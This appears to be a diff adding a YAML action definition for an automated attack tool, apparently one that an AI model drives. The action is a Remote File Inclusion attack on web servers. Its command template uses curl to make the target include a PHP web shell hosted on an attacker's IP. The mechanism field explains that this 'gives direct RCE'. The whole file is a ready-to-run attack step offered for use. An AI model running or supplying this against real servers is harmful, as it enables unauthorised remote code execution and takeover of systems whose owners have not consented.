@@ -1,0 +1,16 @@
+name: rfi
+category: web
+description: Remote File Inclusion
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s '{target_url}?page=http://{attacker_ip}/shell.php'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Include remote file in PHP (allow_url_include=On). Host PHP web shell on attacker, include via vulnerable parameter. Less common than LFI but gives direct RCE."
